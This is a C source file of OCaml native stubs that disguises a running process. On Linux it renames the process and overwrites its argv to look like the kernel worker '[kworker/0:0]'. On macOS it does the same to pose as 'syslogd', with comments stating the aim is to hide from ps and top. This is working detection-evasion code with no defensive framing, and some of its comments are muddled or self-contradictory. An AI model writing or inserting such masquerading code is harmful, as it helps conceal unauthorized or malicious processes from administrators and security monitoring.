#include <string.h>
#include <caml/mlvalues.h>
#include <caml/memory.h>
#include <caml/alloc.h>

#ifdef __linux__
#include <sys/prctl.h>

/* Global variables to hold argc/argv captured at startup */
int global_argc = 0;
char **global_argv = NULL;

__attribute__((constructor)) void capture_argv(int argc, char **argv, char **envp)
{
    global_argc = argc;
    global_argv = argv;
}
#endif

#ifdef __APPLE__
#include <pthread.h>
#endif

/* Get default process name based on OS */
CAMLprim value caml_get_default_process_name(value unit)
{
    CAMLparam1(unit);
#ifdef __APPLE__
    /* macOS: 'syslogd' is a common background daemon */
    CAMLreturn(caml_copy_string("syslogd"));
#else
    /* Linux: disguise as kernel worker */
    CAMLreturn(caml_copy_string("[kworker/0:0]"));
#endif
}

/* Set process name to hide from ps/top */
CAMLprim value caml_set_process_name(value v_name)
{
    CAMLparam1(v_name);
    const char *name = String_val(v_name);

#ifdef __linux__
    /* Linux: use prctl to set process name */
    prctl(PR_SET_NAME, name, 0, 0, 0);

    /* Linux: Attempt to overwrite argv[0] */
    /* We access the saved argv pointer if available, or try to locate it.
       References: http://www.cis.syr.edu/~wedu/seed/Labs_12.04/System/Root_Dirty_COW/files/dirtyc0w.c */

    /* NOTE: We need a way to access the original argv.
       Since we are in a shared object/linked code, we can use a constructor to capture it?
       Actually, common trick is `extern char **environ;` to find the stack bottom,
       but `argv` is just above `environ`. */

    /* Let's try to find argv from environ pointer which is standard global */
    /* (Code removed: unused/fragile) */

    /* argv array is just before environ array on the stack.
       However, the *content* strings are likely after.
       But usually `argv[argc] == NULL` is exactly where `environ` starts?
       No, `argv[argc]` is NULL, then `environ` array starts.
       So &argv[argc + 1] _might_ be `environ`.

       Reverse engineering:
       environ is `char **`.
       argv is `char **`.
       The stack layout is usually: argc, argv[0]...argv[n], NULL, env[0]...env[m], NULL.

       So `environ` points to `env[0]`.
       The address of `environ` variable itself is in data segment.
       The value `environ` holds is a pointer to the environment array on stack.

       We can walk back from `environ` (the array) to find NULL, then the arguments?
       This is fragile.

       Better approach: simpler, standard Linux `setproctitle` implementations
       often assume `argv` global is passed or captured `main`.

       But wait, `caml_startup` usually saves `argv`.
       `caml_sys_argv` (OCaml value) is a copy.

       Alternative:
       Scan `/proc/self/cmdline`? No, that's read only.

       Let's use the `__attribute__((constructor))` approach to capture `argv` before OCaml main starts.
       Only works if this C file is linked statically or loaded early?
       Yes, standard linking should work.
*/
    /* See implementation below at the end of file for the constructor to capture global_argv */

    /* Globals defined at top level */

    if (global_argv && global_argv[0])
    {
        size_t new_len = strlen(name);
        char *start = global_argv[0];
        char *end = global_argv[0] + strlen(global_argv[0]);

        /* Find total contiguous length */
        for (int i = 1; i < global_argc; i++)
        {
            if (global_argv[i] == end + 1)
            {
                end = global_argv[i] + strlen(global_argv[i]);
            }
            else
            {
                break;
            }
        }

        size_t total_len = end - start;

        /* Adaptive name selection: avoid ugly truncation */
        const char *best_name = name;
        size_t name_len = strlen(name);

        if (name_len > total_len)
        {
            if (total_len >= 9)
            {
                best_name = "[kworker]";
            }
            else if (total_len >= 7)
            {
                best_name = "kworker";
            }
            /* else keep original and let it truncate */
            name_len = strlen(best_name);
        }

        memset(start, 0, total_len);

        size_t copy_len = name_len < total_len ? name_len : total_len;
        memcpy(start, best_name, copy_len);

        /* Clear remaining args if disjoint?
           The contiguous logic handles the main block.
           We should loop remaining args and clear them too if they are disjoint. */
        for (int i = 1; i < global_argc; i++)
        {
            if (global_argv[i] > start && global_argv[i] < start + total_len)
            {
                continue; /* Inside contiguous block, already wiped */
            }
            memset(global_argv[i], 0, strlen(global_argv[i]));
        }
    }
#endif

#ifdef __APPLE__
    /* macOS: use pthread_setname_np so it shows up in activity monitor/crash logs */
    pthread_setname_np(name);

/* ALSO try to overwrite argv[0] to fool ps */
/* This requires access to the raw argv memory via _NSGetArgv */
#include <crt_externs.h>
    char ***ns_argv = _NSGetArgv();
    char **argv = *ns_argv;

    if (argv && argv[0])
    {
        /* Aggressive strategy: Find the total contiguous length of argv strings to maximize space. */
        char *start = argv[0];
        char *end = argv[0] + strlen(argv[0]);

        /* Find the end of the last contiguous argument */
        for (int i = 1; argv[i] != NULL; i++)
        {
            size_t len = strlen(argv[i]);
            /* Check continuity: current arg should start right after previous arg's null terminator */
            if (argv[i] == end + 1)
            {
                end = argv[i] + len;
            }
            else
            {
                /* Discontinuity found, stop strict contiguous grouping here */
                break;
            }
        }

        /* Wipe the contiguous block */
        size_t total_contiguous_len = end - start;
        memset(start, 0, total_contiguous_len);

        /* Write fake name into the contiguous block */
        size_t name_len = strlen(name);
        if (name_len > total_contiguous_len)
            name_len = total_contiguous_len;
        memcpy(start, name, name_len);

        /* IMPORTANT: Wipe ALL remaining arguments independently */
        for (int i = 1; argv[i] != NULL; i++)
        {
            char *arg_ptr = argv[i];
            /* If this arg overlaps with the new name (in the contiguous block),
               skip the overlapping part to avoid overwriting the name we just wrote. */
            if (arg_ptr < start + name_len)
            {
                size_t arg_len = strlen(arg_ptr); /* Note: strlen might be 0 if we just memset it effectively, but let's be safe */
                char *arg_end = arg_ptr + arg_len;
                char *name_end = start + name_len;

                if (name_end < arg_end)
                {
                    /* Zeros out the tail of this arg that is NOT part of the new name */
                    memset(name_end, 0, arg_end - name_end);
                }
                continue;
            }

            /* Safe to wipe completely */
            memset(arg_ptr, 0, strlen(arg_ptr));
        }

        /* Nullify argv[1] to update the pointer array as well */
        if (argv[1] != NULL)
            argv[1] = NULL;
    }
#endif

    CAMLreturn(Val_unit);
}
